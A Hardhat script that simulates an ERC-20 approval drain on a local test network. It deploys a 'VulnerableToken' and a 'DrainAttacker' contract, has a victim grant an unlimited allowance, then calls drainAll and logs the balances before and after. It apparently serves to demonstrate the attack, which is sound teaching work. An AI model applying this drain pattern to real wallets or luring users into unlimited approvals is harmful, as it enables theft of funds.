const { ethers } = require("hardhat");

async function main() {
  const [deployer, victim] = await ethers.getSigners();
  console.log("=================================");
  console.log("  ERC-20 Drain Simulation");
  console.log("=================================");
  console.log("Deployer (Attacker):", deployer.address);
  console.log("Victim:             ", victim.address);

  // Deploy token
  console.log("\n[1] Deploying VulnerableToken...");
  const Token = await ethers.getContractFactory("VulnerableToken");
  const token = await Token.deploy(1000000);
  await token.waitForDeployment();
  console.log("Token deployed at:", token.target);

  // Deploy attacker contract
  console.log("\n[2] Deploying DrainAttacker...");
  const Attacker = await ethers.getContractFactory("DrainAttacker");
  const attacker = await Attacker.deploy();
  await attacker.waitForDeployment();
  console.log("Attacker deployed at:", attacker.target);

  // Fund victim
  console.log("\n[3] Funding victim with 10,000 VULN tokens...");
  await token.transfer(victim.address, ethers.parseEther("10000"));

  const balanceBefore = await token.balanceOf(victim.address);
  console.log("Victim balance BEFORE:", ethers.formatEther(balanceBefore), "VULN");

  // Victim gives unlimited approval (the vulnerability)
  console.log("\n[4] Victim approving MAX_UINT256 to attacker... ⚠️");
  await token.connect(victim).approve(attacker.target, ethers.MaxUint256);
  console.log("Approval granted!");

  // Check allowance
  const allowance = await token.allowance(victim.address, attacker.target);
  console.log("Allowance set to:", allowance.toString());

  // Attacker drains
  console.log("\n[5] Attacker draining victim wallet... 🚨");
  await attacker.drainAll(token.target, victim.address);

  // Final balances
  const balanceAfter = await token.balanceOf(victim.address);
  const attackerBal  = await token.balanceOf(deployer.address);

  console.log("\n=================================");
  console.log("  Results");
  console.log("=================================");
  console.log("Victim balance AFTER: ", ethers.formatEther(balanceAfter), "VULN");
  console.log("Attacker balance:     ", ethers.formatEther(attackerBal), "VULN");
  console.log("\n✅ Drain simulation complete!");
  console.log("This is exactly how real ERC-20 approval exploits work.");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
